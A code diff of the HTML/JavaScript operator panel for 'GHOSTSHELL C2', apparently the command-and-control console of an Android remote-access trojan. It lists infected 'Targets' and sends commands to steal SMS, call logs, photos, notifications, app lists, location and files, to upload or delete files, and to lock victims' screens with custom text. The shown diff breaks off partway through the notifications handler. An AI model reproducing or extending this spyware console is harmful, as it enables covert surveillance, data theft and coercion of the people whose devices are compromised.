@@ -2,1353 +2,324 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
-    <title>ANONYMOUS SHELL v2.0</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GHOSTSHELL C2</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Share Tech Mono', 'Courier New', Courier, monospace;
-        }
-
-        /* Loading Screen */
-        #loading-screen {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: #000;
-            z-index: 9999;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            transition: opacity 0.5s ease;
-        }
-
-        .loading-container {
-            text-align: center;
-            width: 80%;
-            max-width: 600px;
-        }
-
-        .anonymous-logo {
-            font-size: 3rem;
-            color: #00ff00;
-            text-shadow: 0 0 20px #00ff00;
-            margin-bottom: 30px;
-            letter-spacing: 5px;
-            animation: pulse 2s infinite;
-        }
-
-        @keyframes pulse {
-            0% { opacity: 1; }
-            50% { opacity: 0.5; }
-            100% { opacity: 1; }
-        }
-
-        .progress-bar {
-            width: 100%;
-            height: 30px;
-            background: #111;
-            border: 2px solid #00ff00;
-            position: relative;
-            overflow: hidden;
-            margin-bottom: 20px;
-        }
-
-        .progress-fill {
-            width: 0%;
-            height: 100%;
-            background: #00ff00;
-            box-shadow: 0 0 20px #00ff00;
-            transition: width 0.1s linear;
-        }
-
-        .loading-text {
-            color: #00ff00;
-            font-size: 1.2rem;
-            margin: 20px 0;
-            text-transform: uppercase;
-        }
-
-        .system-info {
-            color: #666;
-            font-size: 0.9rem;
-            border-top: 1px solid #00ff00;
-            padding-top: 20px;
-            margin-top: 20px;
-        }
-
-        /* Main Content */
         :root {
-            --bg-primary: #0a0a0a;
-            --bg-secondary: #111111;
-            --accent-green: #00ff00;
-            --accent-red: #ff0000;
-            --accent-purple: #aa00ff;
-            --text-primary: #e0e0e0;
-            --text-secondary: #666666;
-            --border-color: #333333;
-            --glow-green: 0 0 10px rgba(0, 255, 0, 0.5);
-            --glow-red: 0 0 10px rgba(255, 0, 0, 0.5);
-        }
-
-        body {
-            background: var(--bg-primary);
-            color: var(--text-primary);
-            min-height: 100vh;
-            opacity: 0;
-            transition: opacity 0.3s ease;
-            padding: 10px;
-        }
-
-        body.visible {
-            opacity: 1;
-        }
-
-        /* Matrix effect background */
-        body::before {
-            content: "";
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: repeating-linear-gradient(0deg, rgba(0,255,0,0.03) 0px, rgba(0,0,0,0.5) 1px, transparent 2px);
-            pointer-events: none;
-            z-index: -1;
-        }
-
-        .container {
-            max-width: 1400px;
-            margin: 0 auto;
-            display: grid;
-            grid-template-columns: 280px 1fr;
-            gap: 15px;
-            height: calc(100vh - 20px);
-        }
-
-        /* Mobile Responsive */
-        @media (max-width: 768px) {
-            .container {
-                grid-template-columns: 1fr;
-                height: auto;
-            }
-            
-            .device-list-panel {
-                height: 200px;
-                margin-bottom: 10px;
-            }
-            
-            .main-grid {
-                grid-template-columns: repeat(2, 1fr) !important;
-            }
-            
-            .modal-content {
-                width: 95%;
-                margin: 2% auto;
-                height: 90vh;
-            }
-        }
-
-        /* Device List Panel */
-        .device-list-panel {
-            background: var(--bg-secondary);
-            border: 2px solid var(--accent-green);
-            padding: 15px;
-            border-radius: 5px;
-            box-shadow: var(--glow-green);
-            overflow: hidden;
-            display: flex;
-            flex-direction: column;
-        }
-
-        .panel-header {
-            border-bottom: 1px solid var(--accent-green);
-            padding-bottom: 10px;
-            margin-bottom: 15px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            color: var(--accent-green);
-            text-transform: uppercase;
-            font-size: 1.1rem;
-        }
-
-        .panel-header i {
-            margin-right: 10px;
-        }
-
-        .device-count {
-            background: var(--accent-green);
-            color: var(--bg-primary);
-            padding: 2px 8px;
-            border-radius: 3px;
-            font-size: 0.8rem;
-        }
-
-        #device-list {
-            overflow-y: auto;
-            flex-grow: 1;
-        }
-
-        .device-item {
-            padding: 12px;
-            border: 1px solid var(--border-color);
-            margin-bottom: 8px;
-            cursor: pointer;
-            transition: all 0.2s ease;
-            border-radius: 3px;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .device-item::before {
-            content: ">";
-            position: absolute;
-            left: -20px;
-            color: var(--accent-green);
-            transition: left 0.2s ease;
-        }
-
-        .device-item:hover::before,
-        .device-item.active::before {
-            left: 5px;
-        }
-
-        .device-item:hover {
-            border-color: var(--accent-green);
-            background: rgba(0, 255, 0, 0.1);
-        }
-
-        .device-item.active {
-            border-color: var(--accent-green);
-            background: rgba(0, 255, 0, 0.2);
-            box-shadow: var(--glow-green);
-        }
-
-        .device-name {
-            font-weight: bold;
-            color: var(--accent-green);
-            margin-bottom: 5px;
-        }
-
-        .device-info {
-            font-size: 0.8rem;
-            color: var(--text-secondary);
-        }
-
-        .device-status {
-            position: absolute;
-            top: 5px;
-            right: 5px;
-            width: 8px;
-            height: 8px;
-            border-radius: 50%;
-            background: var(--accent-green);
-            box-shadow: var(--glow-green);
-        }
-
-        /* Main Content */
-        .main-content {
-            display: flex;
-            flex-direction: column;
-            gap: 15px;
-        }
-
-        .status-bar {
-            background: var(--bg-secondary);
-            border: 2px solid var(--accent-green);
-            padding: 15px;
-            border-radius: 5px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            flex-wrap: wrap;
-            gap: 10px;
-        }
-
-        .target-info {
-            display: flex;
-            gap: 20px;
-            align-items: center;
-        }
-
-        .target-label {
-            color: var(--text-secondary);
-            font-size: 0.9rem;
-        }
-
-        .target-value {
-            color: var(--accent-green);
-            font-weight: bold;
-            text-transform: uppercase;
-        }
-
-        .connection-status {
-            padding: 5px 10px;
-            border-radius: 3px;
-            font-size: 0.9rem;
-            text-transform: uppercase;
-        }
-
-        .status-online {
-            background: rgba(0, 255, 0, 0.2);
-            color: var(--accent-green);
-            border: 1px solid var(--accent-green);
-        }
-
-        .status-offline {
-            background: rgba(255, 0, 0, 0.2);
-            color: var(--accent-red);
-            border: 1px solid var(--accent-red);
-        }
-
-        .main-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(140px, 1fr));
-            gap: 10px;
-        }
-
-        .grid-btn {
-            background: var(--bg-secondary);
-            border: 2px solid var(--border-color);
-            color: var(--text-primary);
-            padding: 15px 10px;
-            cursor: pointer;
-            transition: all 0.2s ease;
-            text-align: center;
-            border-radius: 5px;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .grid-btn::before {
-            content: "";
-            position: absolute;
-            top: 0;
-            left: -100%;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(0, 255, 0, 0.2), transparent);
-            transition: left 0.5s ease;
-        }
-
-        .grid-btn:hover::before {
-            left: 100%;
-        }
-
-        .grid-btn:hover {
-            border-color: var(--accent-green);
-            box-shadow: var(--glow-green);
-            transform: translateY(-2px);
-        }
-
-        .grid-btn:disabled {
-            opacity: 0.3;
-            cursor: not-allowed;
-            border-color: var(--border-color);
-            box-shadow: none;
-            transform: none;
-        }
-
-        .grid-btn i {
-            display: block;
-            font-size: 2rem;
-            margin-bottom: 10px;
-            color: var(--accent-green);
-        }
-
-        /* Modal */
-        .modal {
-            display: none;
-            position: fixed;
-            z-index: 1000;
-            left: 0;
-            top: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(0, 0, 0, 0.9);
-            backdrop-filter: blur(5px);
-        }
-
-        .modal-content {
-            background: var(--bg-secondary);
-            margin: 2% auto;
-            padding: 20px;
-            border: 2px solid var(--accent-green);
-            width: 90%;
-            max-width: 1200px;
-            height: 90vh;
-            display: flex;
-            flex-direction: column;
-            border-radius: 5px;
-            box-shadow: var(--glow-green);
-            position: relative;
-        }
-
-        .modal-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            border-bottom: 2px solid var(--accent-purple);
-            padding-bottom: 15px;
-            margin-bottom: 15px;
-        }
-
-        .modal-title {
-            color: var(--accent-green);
-            font-size: 1.8rem;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-        }
-
-        .modal-title i {
-            margin-right: 10px;
-            color: var(--accent-purple);
-        }
-
-        .close {
-            color: var(--text-secondary);
-            font-size: 2rem;
-            font-weight: bold;
-            cursor: pointer;
-            transition: color 0.2s ease;
-        }
-
-        .close:hover {
-            color: var(--accent-red);
-        }
-
-        .modal-body {
-            flex-grow: 1;
-            overflow-y: auto;
-            padding: 10px;
-            background: rgba(0, 0, 0, 0.3);
-            border-radius: 3px;
-        }
-
-        .modal-footer {
-            padding-top: 15px;
-            border-top: 1px solid var(--border-color);
-            display: flex;
-            gap: 10px;
-            flex-wrap: wrap;
-        }
-
-        .modal-footer input {
-            flex: 1;
-            min-width: 200px;
-            background: var(--bg-primary);
-            border: 2px solid var(--border-color);
-            color: var(--text-primary);
-            padding: 10px;
-            border-radius: 3px;
-        }
-
-        .modal-footer button {
-            background: var(--bg-primary);
-            border: 2px solid var(--accent-green);
-            color: var(--accent-green);
-            padding: 10px 20px;
-            cursor: pointer;
-            transition: all 0.2s ease;
-            border-radius: 3px;
-            text-transform: uppercase;
-            font-weight: bold;
-        }
-
-        .modal-footer button:hover {
-            background: var(--accent-green);
-            color: var(--bg-primary);
-            box-shadow: var(--glow-green);
-        }
-
-        /* Table Styling */
-        table {
-            width: 100%;
-            border-collapse: collapse;
-        }
-
-        th, td {
-            padding: 12px 8px;
-            text-align: left;
-            border-bottom: 1px solid var(--border-color);
-        }
-
-        th {
-            color: var(--accent-purple);
-            text-transform: uppercase;
-            font-size: 0.9rem;
-        }
-
-        tr:hover {
-            background: rgba(0, 255, 0, 0.1);
-        }
-
-        .action-btn {
-            background: none;
-            border: 1px solid var(--accent-green);
-            color: var(--accent-green);
-            padding: 5px 10px;
-            cursor: pointer;
-            margin: 2px;
-            border-radius: 3px;
-            transition: all 0.2s ease;
-        }
-
-        .action-btn:hover {
-            background: var(--accent-green);
-            color: var(--bg-primary);
-        }
-
-        .action-btn.delete {
-            border-color: var(--accent-red);
-            color: var(--accent-red);
-        }
-
-        .action-btn.delete:hover {
-            background: var(--accent-red);
-            color: var(--bg-primary);
-        }
-
-        /* File Manager */
-        .current-path {
-            background: var(--bg-primary);
-            padding: 10px;
-            border: 1px solid var(--accent-green);
-            margin-bottom: 15px;
-            color: var(--accent-purple);
-        }
-
-        .folder-link {
-            color: var(--accent-green);
-            text-decoration: none;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            gap: 5px;
-        }
-
-        .folder-link i {
-            margin-right: 5px;
-        }
-
-        .folder-link:hover {
-            text-shadow: var(--glow-green);
-        }
-
-        /* Gallery Grid */
-        #gallery-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
-            gap: 15px;
-        }
-
-        .gallery-item {
-            border: 1px solid var(--border-color);
-            padding: 5px;
-            cursor: pointer;
-            transition: all 0.2s ease;
-        }
-
-        .gallery-item:hover {
-            border-color: var(--accent-green);
-            box-shadow: var(--glow-green);
-            transform: scale(1.02);
-        }
-
-        .gallery-item img {
-            width: 100%;
-            height: 150px;
-            object-fit: cover;
-        }
-
-        .gallery-item p {
-            text-align: center;
-            font-size: 0.8rem;
-            padding: 5px;
-            color: var(--text-secondary);
-        }
-
-        /* Popup Alert */
-        #popup-overlay {
-            position: fixed;
-            top: 20px;
-            right: 20px;
-            background: var(--bg-secondary);
-            border: 2px solid var(--accent-purple);
-            padding: 20px;
-            z-index: 2000;
-            display: none;
-            box-shadow: 0 0 30px var(--accent-purple);
-            max-width: 350px;
-            border-radius: 5px;
-            animation: slideIn 0.3s ease;
-        }
-
-        @keyframes slideIn {
-            from {
-                transform: translateX(100%);
-                opacity: 0;
-            }
-            to {
-                transform: translateX(0);
-                opacity: 1;
-            }
-        }
-
-        #popup-overlay h3 {
-            color: var(--accent-purple);
-            margin-bottom: 10px;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-
-        #popup-content {
-            color: var(--text-primary);
-            line-height: 1.5;
-        }
-
-        /* Terminal Style */
-        .terminal-line {
-            color: var(--accent-green);
-            font-family: 'Courier New', monospace;
-            line-height: 1.6;
-        }
-
-        .terminal-prompt::before {
-            content: "$ ";
-            color: var(--accent-purple);
-        }
+            --bg-color: #0d0d0d;
+            --panel-bg: #1a1a1a;
+            --border-color: #00ff00;
+            --text-color: #e0e0e0;
+            --glow-color: rgba(0, 255, 0, 0.5);
+            --accent-color: #ff00ff;
+        }
+        body { background-color: var(--bg-color); color: var(--text-color); font-family: 'Courier New', Courier, monospace; margin: 0; padding: 15px; }
+        .container { max-width: 1400px; margin: auto; display: grid; grid-template-columns: 250px 1fr; gap: 20px; }
+        .header { grid-column: 1 / -1; text-align: center; margin-bottom: 10px; }
+        .header h1 { color: var(--border-color); text-shadow: 0 0 10px var(--glow-color); }
+
+        .device-list-panel { background: var(--panel-bg); border: 1px solid var(--border-color); padding: 15px; height: 80vh; overflow-y: auto; }
+        .device-list-panel h2 { border-bottom: 1px solid var(--accent-color); padding-bottom: 10px; margin-bottom: 10px; }
+        .device-item { padding: 10px; border-bottom: 1px solid #333; cursor: pointer; }
+        .device-item:hover, .device-item.active { background: var(--border-color); color: var(--bg-color); }
+        .device-item small { display: block; font-size: 0.8em; opacity: 0.7; }
+
+        .main-content { display: flex; flex-direction: column; }
+        .status-bar { background: var(--panel-bg); border: 1px solid var(--border-color); padding: 10px; margin-bottom: 20px; display: flex; justify-content: space-between; flex-wrap: wrap; }
+        .status-bar span { color: var(--accent-color); }
+        .main-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(130px, 1fr)); gap: 15px; }
+        .grid-btn { background: var(--panel-bg); border: 1px solid var(--border-color); color: var(--border-color); padding: 15px; font-size: 0.9rem; cursor: pointer; transition: all 0.3s ease; text-align: center; }
+        .grid-btn:hover { background: var(--border-color); color: var(--bg-color); box-shadow: 0 0 15px var(--glow-color); }
+        .grid-btn:disabled { background: #111; color: #555; border-color: #444; cursor: not-allowed; }
+        .grid-btn i { display: block; font-size: 1.8rem; margin-bottom: 10px; }
+
+        .modal { display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.8); }
+        .modal-content { background-color: var(--bg-color); margin: 5% auto; padding: 20px; border: 1px solid var(--border-color); width: 80%; max-width: 900px; height: 75vh; display: flex; flex-direction: column; }
+        .modal-header { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid var(--accent-color); padding-bottom: 10px; margin-bottom: 10px; }
+        .modal-title { color: var(--accent-color); font-size: 1.5rem; }
+        .modal-body { flex-grow: 1; overflow-y: auto; white-space: pre-wrap; word-break: break-word; font-size: 0.9em; }
+        .close { color: #aaa; float: right; font-size: 28px; font-weight: bold; cursor: pointer; }
+
+        table { width: 100%; border-collapse: collapse; } th, td { padding: 8px; text-align: left; border-bottom: 1px solid #333; } th { color: var(--border-color); }
+        .action-btn { background: none; border: 1px solid var(--accent-color); color: var(--accent-color); cursor: pointer; margin: 2px; padding: 3px 6px; }
+
+        #gallery-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(150px, 1fr)); gap: 15px; }
+        .gallery-item img { width: 100%; height: 100px; object-fit: cover; cursor: pointer; border: 1px solid var(--border-color); }
+        .gallery-item p { font-size: 0.7rem; text-align: center; word-break: break-all; }
+
+        #popup-overlay { position: fixed; top: 20px; right: 20px; background-color: var(--accent-color); color: var(--bg-color); padding: 20px; border: 2px solid var(--border-color); z-index: 2000; display: none; box-shadow: 0 0 20px var(--glow-color); max-width: 350px; }
     </style>
 </head>
 <body>
-    <!-- Loading Screen -->
-    <div id="loading-screen">
-        <div class="loading-container">
-            <div class="anonymous-logo">
-                <i class="fas fa-mask"></i> ANONYMOUS
-            </div>
-            <div class="progress-bar">
-                <div class="progress-fill" id="progress-fill"></div>
-            </div>
-            <div class="loading-text" id="loading-text">
-                INITIALIZING SYSTEM...
-            </div>
-            <div class="system-info">
-                > SYSTEM VERSION 2.0<br>
-                > SECURE CONNECTION ESTABLISHED<br>
-                > LOADING MODULES...
-            </div>
-        </div>
+
+<div class="container">
+    <div class="header">
+        <h1><i class="fas fa-user-secret"></i> GHOSTSHELL C2</h1>
     </div>
 
-    <!-- Main Content -->
-    <div class="container">
-        <!-- Device List Panel -->
-        <div class="device-list-panel">
-            <div class="panel-header">
-                <span><i class="fas fa-skull"></i> TARGETS</span>
-                <span class="device-count" id="device-count">0</span>
-            </div>
-            <div id="device-list">
-                <div style="color: #666; text-align: center; padding: 20px;">
-                    <i class="fas fa-satellite-dish"></i><br>
-                    Waiting for connections...
-                </div>
-            </div>
-        </div>
-
-        <!-- Main Content Area -->
-        <div class="main-content">
-            <!-- Status Bar -->
-            <div class="status-bar">
-                <div class="target-info">
-                    <span class="target-label"><i class="fas fa-bullseye"></i> TARGET:</span>
-                    <span class="target-value" id="device-info">NONE SELECTED</span>
-                </div>
-                <div class="connection-status status-offline" id="connection-status">
-                    OFFLINE
-                </div>
-            </div>
-
-            <!-- Main Grid -->
-            <div class="main-grid" id="main-grid-panel"></div>
-        </div>
+    <div class="device-list-panel">
+        <h2><i class="fas fa-satellite-dish"></i> Targets</h2>
+        <div id="device-list">No devices connected.</div>
     </div>
 
-    <!-- Modal -->
-    <div id="main-modal" class="modal">
-        <div class="modal-content">
-            <div class="modal-header">
-                <h2 id="modal-title" class="modal-title"><i class="fas fa-terminal"></i> SYSTEM</h2>
-                <span class="close" onclick="closeModal()">&times;</span>
-            </div>
-            <div id="modal-body" class="modal-body"></div>
-            <div id="modal-footer" class="modal-footer"></div>
+    <div class="main-content">
+        <div class="status-bar">
+            <div>Target: <span id="device-info">None Selected</span></div>
+            <div>Status: <span id="connection-status">-</span></div>
+        </div>
+
+        <div class="main-grid" id="main-grid-panel">
+            <!-- Buttons will be dynamically enabled/disabled -->
         </div>
     </div>
+</div>
 
-    <!-- Popup Alert -->
-    <div id="popup-overlay">
-        <h3><i class="fas fa-exclamation-triangle"></i> ALERT</h3>
-        <p id="popup-content"></p>
-    </div>
+<div id="main-modal" class="modal"><div class="modal-content"><div class="modal-header"><h2 id="modal-title" class="modal-title"></h2><span class="close" onclick="closeModal()">&times;</span></div><div id="modal-body" class="modal-body"></div><div id="modal-footer" style="padding-top: 10px;"></div></div></div>
+<div id="popup-overlay"><h3><i class="fas fa-bell"></i> Alert</h3><p id="popup-content"></p></div>
 
-    <!-- Hidden File Upload -->
-    <input type="file" id="file-upload-input" style="display: none;">
+<script>
+let state = { devices: [], logs: [] };
+let selectedClientId = null;
+let currentModal = null;
+let popupTimeout;
+let flashOn = false;
+let clientDataCache = {};
+let notificationHashes = new Set();
 
-    <script>
-        // State Management
-        let state = { devices: [], logs: [] };
-        let selectedClientId = null;
-        let currentModal = null;
-        let popupTimeout;
-        let flashState = {};
-        let terminalModes = {};
+const mainGridPanel = document.getElementById('main-grid-panel');
 
-        // Loading Screen
-        window.addEventListener('load', function() {
-            let progress = 0;
-            const progressFill = document.getElementById('progress-fill');
-            const loadingText = document.getElementById('loading-text');
-            const loadingScreen = document.getElementById('loading-screen');
-            
-            const messages = [
-                "INITIALIZING SYSTEM...",
-                "LOADING MODULES...",
-                "ESTABLISHING SECURE CONNECTION...",
-                "BYPASSING FIREWALL...",
-                "ACCESS GRANTED..."
-            ];
-
-            const interval = setInterval(() => {
-                progress += 2;
-                progressFill.style.width = progress + '%';
-                
-                if (progress <= 20) loadingText.textContent = messages[0];
-                else if (progress <= 40) loadingText.textContent = messages[1];
-                else if (progress <= 60) loadingText.textContent = messages[2];
-                else if (progress <= 80) loadingText.textContent = messages[3];
-                else loadingText.textContent = messages[4];
-                
-                if (progress >= 100) {
-                    clearInterval(interval);
-                    setTimeout(() => {
-                        loadingScreen.style.opacity = '0';
-                        setTimeout(() => {
-                            loadingScreen.style.display = 'none';
-                            document.body.classList.add('visible');
-                        }, 500);
-                    }, 500);
-                }
-            }, 50);
+// API Communication
+async function sendCommand(cmd, body = {}) {
+    if (!selectedClientId) {
+        showPopup('error', 'No target selected.');
+        return;
+    }
+    try {
+        await fetch('/api/command', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ cmd, client_id: selectedClientId, ...body })
         });
+    } catch (e) { console.error('Error sending command:', e); }
+}
 
-        // API Communication
-        async function sendCommand(cmd, body = {}) {
-            if (!selectedClientId) {
-                showPopup('error', 'No target selected. Please select a device first.');
-                return;
-            }
-            
-            try {
-                const response = await fetch('/api/command', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ cmd, client_id: selectedClientId, ...body })
-                });
-                
-                if (!response.ok) {
-                    throw new Error('Command failed');
-                }
-                
-                // Handle special commands
-                if (cmd === 'filemanager' || cmd === 'shell') {
-                    terminalModes[selectedClientId] = cmd;
-                }
-            } catch (e) { 
-                console.error('Error sending command:', e);
-                showPopup('error', 'Failed to send command: ' + e.message);
-            }
+// Core UI and State Management
+function selectDevice(clientId) {
+    if (selectedClientId === clientId) return;
+    selectedClientId = clientId;
+    flashOn = false; // Reset flash state on device switch
+    document.querySelectorAll('.device-item').forEach(el => el.classList.remove('active'));
+    document.getElementById(`device-${clientId.replace(/[:.]/g, '-')}`).classList.add('active');
+    updateMainDashboard();
+    closeModal(); // Close any open modal when switching devices
+}
+
+function updateDeviceList() {
+    const deviceList = document.getElementById('device-list');
+    if (state.devices.length === 0) {
+        deviceList.textContent = 'No devices connected.';
+        if(selectedClientId) selectedClientId = null;
+    } else {
+        deviceList.innerHTML = state.devices.map(dev => `
+            <div class="device-item" id="device-${dev.id.replace(/[:.]/g, '-')}" onclick="selectDevice('${dev.id}')">
+                <strong>${dev.model}</strong>
+                <small>${dev.id} | ${dev.battery}</small>
+            </div>
+        `).join('');
+
+        if (!selectedClientId || !state.devices.some(d => d.id === selectedClientId)) {
+            selectDevice(state.devices[0].id);
+        } else {
+            // Reselect to update active class
+            document.getElementById(`device-${selectedClientId.replace(/[:.]/g, '-')}`).classList.add('active');
         }
+    }
+    updateMainDashboard();
+}
 
-        // Device Selection
-        function selectDevice(clientId) {
-            if (selectedClientId === clientId) return;
-            
-            selectedClientId = clientId;
-            
-            // Reset flash state for new device
-            if (!flashState[clientId]) {
-                flashState[clientId] = false;
-            }
-            
-            // Update UI
-            document.querySelectorAll('.device-item').forEach(el => {
-                el.classList.remove('active');
-            });
-            
-            const deviceEl = document.getElementById(`device-${clientId.replace(/[:.]/g, '-')}`);
-            if (deviceEl) {
-                deviceEl.classList.add('active');
-            }
-            
-            updateMainDashboard();
-            closeModal();
-        }
+function updateMainDashboard() {
+    const devInfo = document.getElementById('device-info');
+    const connStatus = document.getElementById('connection-status');
 
-        // Update Device List
-        function updateDeviceList() {
-            const deviceList = document.getElementById('device-list');
-            const deviceCount = document.getElementById('device-count');
-            
-            if (state.devices.length === 0) {
-                deviceList.innerHTML = '<div style="color: #666; text-align: center; padding: 20px;"><i class="fas fa-satellite-dish"></i><br>Waiting for connections...</div>';
-                deviceCount.textContent = '0';
-                selectedClientId = null;
-            } else {
-                deviceList.innerHTML = state.devices.map(dev => `
-                    <div class="device-item" id="device-${dev.id.replace(/[:.]/g, '-')}" onclick="selectDevice('${dev.id}')">
-                        <div class="device-name">
-                            <i class="fas fa-mobile-alt"></i> ${dev.model || 'Unknown Device'}
-                        </div>
-                        <div class="device-info">
-                            <i class="fas fa-network-wired"></i> ${dev.id}<br>
-                            <i class="fas fa-battery-three-quarters"></i> ${dev.battery || 'N/A'}
-                        </div>
-                        <div class="device-status"></div>
-                    </div>
-                `).join('');
-                
-                deviceCount.textContent = state.devices.length;
-                
-                // Auto-select first device if none selected
-                if (!selectedClientId || !state.devices.some(d => d.id === selectedClientId)) {
-                    selectDevice(state.devices[0].id);
+    if (selectedClientId && state.devices.some(d => d.id === selectedClientId)) {
+        const device = state.devices.find(d => d.id === selectedClientId);
+        devInfo.textContent = device.info_str;
+        connStatus.textContent = 'ONLINE';
+        connStatus.style.color = 'var(--border-color)';
+        mainGridPanel.innerHTML = getGridButtonsHtml(true);
+    } else {
+        devInfo.textContent = 'None Selected';
+        connStatus.textContent = 'OFFLINE';
+        connStatus.style.color = 'red';
+        mainGridPanel.innerHTML = getGridButtonsHtml(false);
+        selectedClientId = null; // Ensure no client is selected if they disconnect
+    }
+}
+
+function getGridButtonsHtml(enabled) {
+    const disabledAttr = enabled ? '' : 'disabled';
+    return `
+        <button class="grid-btn" ${disabledAttr} onclick="openModal('sms')"><i class="fas fa-sms"></i>SMS</button>
+        <button class="grid-btn" ${disabledAttr} onclick="openModal('calls')"><i class="fas fa-phone-alt"></i>Call Logs</button>
+        <button class="grid-btn" ${disabledAttr} onclick="openModal('filemanager')"><i class="fas fa-folder-open"></i>File Manager</button>
+        <button class="grid-btn" ${disabledAttr} onclick="openModal('gallery')"><i class="fas fa-images"></i>Gallery</button>
+        <button class="grid-btn" ${disabledAttr} onclick="openModal('notifications')"><i class="fas fa-bell"></i>Notifications</button>
+        <button class="grid-btn" ${disabledAttr} onclick="openModal('apps')"><i class="fas fa-th-large"></i>Apps</button>
+        <button class="grid-btn" ${disabledAttr} onclick="openModal('toast')"><i class="fas fa-window-maximize"></i>Screen Lock</button>
+        <button class="grid-btn" ${disabledAttr} id="flash-btn" onclick="toggleFlash()"><i class="fas fa-bolt"></i>Flash OFF</button>
+        <button class="grid-btn" ${disabledAttr} onclick="sendCommand('get_location')"><i class="fas fa-map-marker-alt"></i>Location</button>
+    `;
+}
+
+// Modal & Dynamic Content
+function openModal(modalType) {
+    if (!selectedClientId) { showPopup('error', 'Select a target device first.'); return; }
+    currentModal = modalType;
+    document.getElementById('main-modal').style.display = 'block';
+    document.getElementById('modal-title').textContent = modalType.charAt(0).toUpperCase() + modalType.slice(1);
+    renderModalContent();
+    fetchInitialDataForModal(modalType);
+}
+
+function closeModal() {
+    if (currentModal === 'gallery') sendCommand('exit_gallery'); // Tell client to exit gallery mode
+    document.getElementById('main-modal').style.display = 'none';
+    currentModal = null;
+}
+
+function fetchInitialDataForModal(modalType) {
+    const commands = { sms: 'getsms', calls: 'getcalllogs', filemanager: 'filemanager', gallery: 'gallery', apps: 'list_app' };
+    if (commands[modalType]) sendCommand(commands[modalType]);
+    // Notifications are polled, no initial command needed
+}
+
+async function renderModalContent() {
+    const body = document.getElementById('modal-body');
+    const footer = document.getElementById('modal-footer');
+    body.innerHTML = 'Loading...';
+    footer.innerHTML = '';
+
+    if (!selectedClientId || !clientDataCache[selectedClientId]) { body.innerHTML = 'No data available. Client may have just connected.'; return; }
+    const clientData = clientDataCache[selectedClientId];
+
+    switch(currentModal) {
+        case 'gallery':
+            footer.innerHTML = `<button onclick="sendCommand('gallery back')">Back</button><span>Page: ${clientData.gallery?.page || 0}</span><button onclick="sendCommand('gallery next')">Next</button>`;
+            body.innerHTML = '<div id="gallery-grid">' + (clientData.gallery?.files || []).map(file => `
+                <div class="gallery-item">
+                    <img src="data:image/jpeg;base64,${file.thumbnail}" alt="${file.name}"/>
+                    <p>${file.name}</p>
+                </div>`).join('') + '</div>';
+            break;
+         case 'toast':
+             document.getElementById('modal-title').textContent = 'Screen Lock';
+             body.innerHTML = '<p>Enter text to display on the locked screen. The app will request permission if needed.</p>';
+             footer.innerHTML = `<input type="text" id="toast-text" placeholder="Your text here..." style="flex-grow: 1;"><button onclick="sendToast()">Lock Screen</button><button onclick="sendCommand('toast off')">Unlock</button>`;
+             break;
+        // Other cases remain the same but use clientData
+        case 'sms':
+            body.innerHTML = '<table><thead><tr><th>Sender</th><th>Message</th></tr></thead><tbody>' + (clientData.sms_logs || []).map(log => `<tr><td>${log.userSender}</td><td>${log.content}</td></tr>`).join('') + '</tbody></table>';
+            break;
+        case 'calls':
+            body.innerHTML = '<table><thead><tr><th>Number</th><th>Date</th><th>Duration</th><th>Type</th></tr></thead><tbody>' + (clientData.call_logs || []).map(log => `<tr><td>${log.number}</td><td>${log.date}</td><td>${log.duration_seconds}s</td><td>${log.call_type}</td></tr>`).join('') + '</tbody></table>';
+            break;
+        case 'filemanager':
+             footer.innerHTML = `<input type="file" id="file-upload-input" style="display:none;"><button onclick="document.getElementById('file-upload-input').click()">Upload</button><input type="text" id="fm-input" placeholder="e.g., new_name.txt" style="width: 50%;"><button onclick="handleFmAction('rename')">Rename</button>`;
+            const fmData = clientData.file_manager;
+            let filesHtml = `<p>Current Path: <span>${fmData.path || '/'}</span></p><table><thead><tr><th>Name</th><th>Type</th><th>Actions</th></tr></thead><tbody><tr><td colspan="3"><a href="#" onclick="sendCommand('cd ..')">.. (Up)</a></td></tr>`;
+            filesHtml += (fmData.files || []).map(file => {
+                const name = file.name;
+                return file.isDirectory ? `<tr><td><a href="#" onclick="sendCommand('cd ${name}')"><i class="fas fa-folder"></i> ${name}</a></td><td>Folder</td><td></td></tr>` :
+                    `<tr><td><i class="fas fa-file"></i> ${name}</td><td>File</td><td><button class="action-btn" onclick="sendCommand('get ${name}')">Download</button><button class="action-btn" onclick="handleFmAction('delete', '${name}')">Delete</button></td></tr>`;
+            }).join('');
+            body.innerHTML = filesHtml + '</tbody></table>';
+            document.getElementById('file-upload-input').onchange = (e) => { if (e.target.files.length) uploadFile(e.target.files[0], fmData.path); };
+            break;
+         case 'notifications':
